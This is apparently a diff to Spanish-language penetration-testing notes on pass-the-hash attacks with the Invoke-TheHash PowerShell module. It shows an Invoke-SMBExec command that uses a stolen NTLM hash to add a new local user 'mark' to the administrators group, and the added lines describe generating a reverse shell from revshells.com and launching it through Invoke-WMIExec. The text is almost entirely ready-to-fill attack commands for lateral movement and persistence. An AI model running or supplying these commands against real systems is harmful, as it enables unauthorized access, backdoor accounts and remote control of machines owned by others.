@@ -19,4 +19,8 @@ Import-Module .\Invoke-TheHash.psd1
 
 Invoke-SMBExec -Target <ip/hostname> -Domain <domain> -Username <username> -Hash <hash> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
 
+Tambien podemos usar revshell para generar una shell reversa y ejecutarla con WMIExec:
+creamos la reverse shell:
+https://www.revshells.com/:
 
+ Invoke-WMIExec -Target <hostname/ip> -Domain <domain> -Username <username> -Hash <hash> -Command "<reverse_shell_generada>"
